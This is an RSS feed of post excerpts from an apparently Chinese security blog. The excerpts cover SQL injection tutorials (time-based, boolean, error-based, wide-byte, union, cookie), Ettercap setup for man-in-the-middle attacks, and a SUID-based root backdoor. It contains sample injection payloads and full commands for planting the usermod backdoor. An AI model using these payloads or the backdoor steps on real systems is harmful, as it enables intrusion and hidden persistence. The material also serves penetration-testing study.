&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">foreach&lt;/span> ($value &lt;span style="color:#66d9ef">as&lt;/span> $k &lt;span style="color:#f92672">=&amp;gt;&lt;/span> $v){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $filter[$key][$k] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">mysql_real_escape_string&lt;/span>($v);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>
&lt;p>检查数据类型&lt;/p></description></item><item><title>SQL 注入之宽字节注入(MySQL)</title><link>https://wyb0.com/posts/2016/injection-of-wide-byte/</link><pubDate>Fri, 24 Jun 2016 15:32:34 +0000</pubDate><guid>https://wyb0.com/posts/2016/injection-of-wide-byte/</guid><description>&lt;h3 id="0x00-应用场景">0x00 应用场景&lt;/h3>
&lt;p>在注入时通常会使用单引号、双引号等特殊字符。在应用中，通常为了安全，开发者会开启php的magic_quotes_gpc，或者使用addslashes、mysql_real_escape_string等函数对客户端传入的参数进行过滤，则注入的单引号或双引号就会被&lt;code>&amp;quot;\&amp;quot;&lt;/code>转义，但是，如果服务端的数据库使用的是GB2312、GBK、GB18030等宽字节的编码时，则依然会造成注入。&lt;/p></description></item><item><title>SQL 注入之基于时间的注入(MySQL)</title><link>https://wyb0.com/posts/2016/injection-of-time-based/</link><pubDate>Fri, 24 Jun 2016 10:10:27 +0000</pubDate><guid>https://wyb0.com/posts/2016/injection-of-time-based/</guid><description>&lt;h3 id="0x00-特点">0x00 特点&lt;/h3>
&lt;pre tabindex="0">&lt;code>当页面存在注入，但是没有显示位且不管怎么测试返回页面都没有变化，此时可以使用基于时间的盲注进行注入。
其实只要存在SQL注入就可以使用基于时间的盲注，利用范围比较广泛，但是可能受到网络带宽等因素的影响。
&lt;/code>&lt;/pre>&lt;h3 id="0x01-利用方式">0x01 利用方式&lt;/h3>
&lt;pre tabindex="0">&lt;code>整型注入的话可以直接: ?id=if(1=1,sleep(2),1)
字符型的话需要闭合: ?id=2&amp;#39; and if(1=1,sleep(2),1) and &amp;#39;1
&lt;/code>&lt;/pre>&lt;h3 id="0x02-相关函数">0x02 相关函数&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>if(条件, 值1, 值2)&lt;br>
当条件为真时返回值1，条件为假时返回值2&lt;/p></description></item><item><title>SQL 注入之布尔型注入(MySQL)</title><link>https://wyb0.com/posts/2016/injection-of-boolian-based/</link><pubDate>Thu, 23 Jun 2016 23:32:34 +0000</pubDate><guid>https://wyb0.com/posts/2016/injection-of-boolian-based/</guid><description>&lt;h3 id="0x00-特点">0x00 特点&lt;/h3>
&lt;pre tabindex="0">&lt;code>当页面存在注入，但是没有显示位，且没有用echo &amp;#34;mysql_error()&amp;#34;输出错误信息时可以用，
它一次只能猜测一个字节，速度慢，但是只要存在注入就能用
&lt;/code>&lt;/pre>&lt;h3 id="0x01-利用方式">0x01 利用方式&lt;/h3>
&lt;pre tabindex="0">&lt;code>用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) --+
根据返回页面是否相同来得到数据
&lt;/code>&lt;/pre>&lt;h3 id="0x02-注入步骤">0x02 注入步骤&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>找到注入点，判断闭合字符
&lt;img src="https://wyb0.com/img/post/sqli8_get_closed_character.png" alt="得到闭合字符">&lt;/p></description></item><item><title>SQL 注入之报错型注入(MySQL)</title><link>https://wyb0.com/posts/2016/injection-of-error-based/</link><pubDate>Wed, 22 Jun 2016 15:30:54 +0000</pubDate><guid>https://wyb0.com/posts/2016/injection-of-error-based/</guid><description>&lt;h3 id="0x00-前提">0x00 前提&lt;/h3>
&lt;pre tabindex="0">&lt;code>一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用，
它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解
&lt;/code>&lt;/pre>&lt;h3 id="0x01-利用方式">0x01 利用方式&lt;/h3>
&lt;p>报错注入只要套用公式即可，如下(第一个公式count(*)、floor()、rand()、group by不可或缺，后两个公式有32位的限制):&lt;/p></description></item><item><title>SQL 注入之联合查询(MySQL)</title><link>https://wyb0.com/posts/2016/injection-of-union-select/</link><pubDate>Tue, 21 Jun 2016 22:30:18 +0000</pubDate><guid>https://wyb0.com/posts/2016/injection-of-union-select/</guid><description>&lt;h3 id="0x00-前提">0x00 前提&lt;/h3>
&lt;p>要用联合查询进行注入则：页面必须有显示位&lt;/p>
&lt;h3 id="0x01-联合查询">0x01 联合查询&lt;/h3>
&lt;p>union可合并两个或多个select语句的结果集，前提是两个select必有相同列、且各列的数据类型也相同&lt;/p></description></item><item><title>SQL 注入之 load_file 和 into outfile(MySQL)</title><link>https://wyb0.com/posts/2016/injection-of-mysql-function/</link><pubDate>Mon, 20 Jun 2016 08:10:27 +0000</pubDate><guid>https://wyb0.com/posts/2016/injection-of-mysql-function/</guid><description>&lt;h3 id="0x00-load_file-读文件">0x00 load_file() 读文件&lt;/h3>
&lt;ul>
&lt;li>条件:&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>1. 要有file_priv权限: show global variables like &amp;#39;%secure%&amp;#39;;
2. 知道文件绝对路径
3. 能使用union
4. 对web目录有读权限 
注：若过滤了单引号，则可以将函数中的字符进行hex编码
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>
&lt;p>一般步骤&lt;/p></description></item><item><title>SQL 注入</title><link>https://wyb0.com/posts/2016/injection/</link><pubDate>Sun, 19 Jun 2016 20:18:48 +0000</pubDate><guid>https://wyb0.com/posts/2016/injection/</guid><description>&lt;h3 id="0x00-含义">0x00 含义&lt;/h3>
&lt;p>sql注入是将代码插入(拼接)到应用(用户)的输入参数中，之后再将这些参数传递给后台的SQL服务器加以解析并执行的攻击，&lt;/p></description></item><item><title>使用 theHarvester 得到邮箱</title><link>https://wyb0.com/posts/2016/theharvester-blasting-email/</link><pubDate>Thu, 12 May 2016 15:27:14 +0000</pubDate><guid>https://wyb0.com/posts/2016/theharvester-blasting-email/</guid><description>&lt;h3 id="0x00-软件">0x00 软件&lt;/h3>
&lt;pre tabindex="0">&lt;code>使用theHarvester搜集邮箱
使用dnsenum得到邮箱服务器域名
使用nmap查看端口开启情况
使用Hydra进行弱口令猜解
&lt;/code>&lt;/pre>&lt;h3 id="0x01-设置shadowsocks为全局模式">0x01 设置Shadowsocks为全局模式:&lt;/h3>
&lt;p>&lt;img src="https://wyb0.com/img/post/SS.png" alt="设置SS为全局代理">&lt;/p></description></item><item><title>Nmap思维导图</title><link>https://wyb0.com/posts/2016/nmap-mind-mapping/</link><pubDate>Tue, 10 May 2016 20:24:07 +0000</pubDate><guid>https://wyb0.com/posts/2016/nmap-mind-mapping/</guid><description>&lt;h3 id="nmap思维导图如下">nmap思维导图如下：&lt;/h3>
&lt;p>&lt;img src="https://wyb0.com/img/post/nmap.png" alt="nmap思维导图">&lt;/p></description></item><item><title>利用 EtterCap 进行中间人攻击</title><link>https://wyb0.com/posts/2016/linux-install-ettercap/</link><pubDate>Tue, 19 Apr 2016 00:00:00 +0000</pubDate><guid>https://wyb0.com/posts/2016/linux-install-ettercap/</guid><description>&lt;h3 id="0x00-准备">0x00 准备&lt;/h3>
&lt;pre tabindex="0">&lt;code>操作系统：CentOS 
首先，ettercap 安装时需要 4 个依赖包，而且安装包里面也已经提供了 
执行：sudo yum groupinstall &amp;#34;Development tools&amp;#34; #源码安装软件就需要安装这个
使用 wget 下载 ettercap 源码
&lt;/code>&lt;/pre>&lt;h3 id="0x01-查看需要的依赖项">0x01 查看需要的依赖项&lt;/h3>
&lt;pre tabindex="0">&lt;code>[wyb@localhost ettercap-0.8.2]$ vim INSTALL

 #### Bundled libraries 
 Ettercap now bundles the following libraries with the source distribution: 
 libnet 1.1.6 
 curl 7.41.0 
 luajit 2.0.3 
 check 0.9.14 
[wyb@localhost ettercap-0.8.2]$ cd bundled_deps/ 
[wyb@localhost bundled_deps]$ ls 
check curl libnet luajit
&lt;/code>&lt;/pre>&lt;h3 id="0x02-安装依赖包">0x02 安装依赖包&lt;/h3>
&lt;ol>
&lt;li>安装check&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>[wyb@localhost check]$ cd check-0.9.14
[wyb@localhost check-0.9.14]$ ls
[wyb@localhost check-0.9.14]$ ./configure 
[wyb@localhost check-0.9.14]$ make
[wyb@localhost check-0.9.14]$ sudo make install
&lt;/code>&lt;/pre>&lt;ol start="2">
&lt;li>安装curl&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>[wyb@localhost check-0.9.14]$ cd ..
[wyb@localhost curl-7.41.0]$ cd curl/
[wyb@localhost curl-7.41.0]$ cd curl-7.41.0
[wyb@localhost curl-7.41.0]$ make
[wyb@localhost curl-7.41.0]$ sudo make install
&lt;/code>&lt;/pre>&lt;ol start="3">
&lt;li>安装libnet&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>[wyb@localhost curl-7.41.0]$ cd ../../libnet/
[wyb@localhost libnet]$ tar -zxvf libnet-1.1.6.tar.gz
[wyb@localhost libnet]$ cd libnet-1.1.6
[wyb@localhost libnet-1.1.6]$ ./configure 
[wyb@localhost libnet-1.1.6]$ make
[wyb@localhost libnet-1.1.6]$ sudo make install
&lt;/code>&lt;/pre>&lt;ol start="4">
&lt;li>安装luajit&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>[wyb@localhost luajit]$ tar -zxvf LuaJIT-2.0.3.tar.gz 
[wyb@localhost luajit]$ make
[wyb@localhost luajit]$ sudo make install
&lt;/code>&lt;/pre>&lt;ol start="5">
&lt;li>
&lt;p>安装ettercap&lt;/p></description></item><item><title>Linux 之 SUID 后门</title><link>https://wyb0.com/posts/2016/linux-suid-back-door/</link><pubDate>Mon, 18 Apr 2016 20:03:07 +0000</pubDate><guid>https://wyb0.com/posts/2016/linux-suid-back-door/</guid><description>&lt;p>SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制&lt;/p>
&lt;h3 id="0x00-为二进制文件添加s权限从而提升为root权限">0x00 为二进制文件添加s权限从而提升为root权限&lt;/h3>
&lt;ul>
&lt;li>写sudoers添加用户 &lt;code>//最佳方案&lt;/code>&lt;/li>
&lt;li>vim /etc/passwd &lt;code>//将uid和gid改为0&lt;/code>&lt;/li>
&lt;li>vim /etc/shadow &lt;code>//密文覆盖&lt;/code>&lt;/li>
&lt;li>vim root .ssh/证书文件 &lt;code>.ssh这个文件夹和证书的权限要正确，要和原来一致&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-suid主要作用可以是留后门">0x01 SUID主要作用可以是留后门&lt;/h3>
&lt;ul>
&lt;li>在root权限下给usermod一个s权限&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># which usermod #得到usermod的路径 &lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/usr/sbin/usermod
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># chmod u+s /usr/sbin/usermod&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># ls -l /usr/sbin/usermod&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rwsr-x---. &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">98680&lt;/span> Dec &lt;span style="color:#ae81ff">7&lt;/span> &lt;span style="color:#ae81ff">2011&lt;/span> /usr/sbin/usermod
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>usermod给其他人一个x权限&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>root@localhost ~&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#75715e"># chmod o+x /usr/sbin/usermod&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>root@localhost ~&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#75715e"># ls -l /usr/sbin/usermod&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rwsr-x--x. &lt;span style="color:#ae81ff">1&lt;/span> root root &lt;span style="color:#ae81ff">98680&lt;/span> Dec &lt;span style="color:#ae81ff">7&lt;/span> &lt;span style="color:#ae81ff">2011&lt;/span> /usr/sbin/usermod
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>切换到普通用户wyb&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost ~&lt;span style="color:#f92672">]&lt;/span>$ id wyb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uid&lt;span style="color:#f92672">=&lt;/span>500&lt;span style="color:#f92672">(&lt;/span>wyb&lt;span style="color:#f92672">)&lt;/span> gid&lt;span style="color:#f92672">=&lt;/span>500&lt;span style="color:#f92672">(&lt;/span>wyb&lt;span style="color:#f92672">)&lt;/span> groups&lt;span style="color:#f92672">=&lt;/span>500&lt;span style="color:#f92672">(&lt;/span>wyb&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost ~&lt;span style="color:#f92672">]&lt;/span>$ usermod -g root wyb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost ~&lt;span style="color:#f92672">]&lt;/span>$ id wyb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uid&lt;span style="color:#f92672">=&lt;/span>500&lt;span style="color:#f92672">(&lt;/span>wyb&lt;span style="color:#f92672">)&lt;/span> gid&lt;span style="color:#f92672">=&lt;/span>0&lt;span style="color:#f92672">(&lt;/span>root&lt;span style="color:#f92672">)&lt;/span> groups&lt;span style="color:#f92672">=&lt;/span>0&lt;span style="color:#f92672">(&lt;/span>root&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost ~&lt;span style="color:#f92672">]&lt;/span>$ exit
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>验证&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>重新用wyb连接，此时即为root权限
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost ~&lt;span style="color:#f92672">]&lt;/span>$ cd /root &lt;span style="color:#75715e">#若能切换到此目录即证明确实获得了root权限&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>wyb@localhost root&lt;span style="color:#f92672">]&lt;/span>$ ls
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>anaconda-ks.cfg install.log install.log.syslog
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x02-查找拥有s权限的文件">0x02 查找拥有s权限的文件&lt;/h3>
&lt;ul>
&lt;li>find / -perm -u=s -type f 2&amp;gt;/dev/null&lt;/li>
&lt;/ul></description></item><item><title>ASP Cookie 处联合注入</title><link>https://wyb0.com/posts/2015/injection-of-asp-in-the-cookie/</link><pubDate>Fri, 04 Dec 2015 19:42:19 +0000</pubDate><guid>https://wyb0.com/posts/2015/injection-of-asp-in-the-cookie/</guid><description>&lt;h3 id="0x00-cookie注入的使用">0x00 Cookie注入的使用&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>三大Web提交方式&lt;/p>
&lt;ul>
&lt;li>GET：直接在浏览器上面访问地址&lt;/li>
&lt;li>POST：提交表单(会员注册、文件上传等)&lt;/li>
&lt;li>COOKIE：访问网站下面自带的身份验证的值&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Cookie注入利用时机&lt;br>
当用普通注入时，采用and 1=1时出现错误提示(如下图)，普通的注入就没办法了，可以尝试大小写，编码等绕过，若过滤严谨，无法绕过，这时就可以采用cookie注入。
&lt;img src="https://wyb0.com/img/post/cookie_injection_conditions.png" alt="Cookie注入条件">&lt;/p></description></item></channel></rss>